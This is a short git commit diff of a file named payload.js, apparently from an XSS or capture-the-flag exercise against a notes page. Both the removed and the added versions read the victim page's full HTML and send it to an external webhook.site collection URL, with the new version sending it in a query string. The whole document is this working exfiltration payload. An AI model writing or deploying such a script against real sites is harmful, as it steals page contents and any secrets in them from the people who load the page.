06fa67ab2e068783df5571a81bae94ed5dbdc22d
Axl <bryannicholas7@gmail.com>
2025-06-20 21:06:58 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,15 +1,5 @@
 async function getNotes() {
-    (async () => {
-    const html = document.documentElement.outerHTML;
-    await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6", {
-        method: "GET",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ html })
-    });
-    })();
-
-    const output = document.createElement('p');
-    output.textContent = _.capitalize('cek webhook!');
-    document.body.appendChild(output);
+  const html = document.documentElement.outerHTML;
+  await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?dump=" + encodeURIComponent(html));
 }
 getNotes();
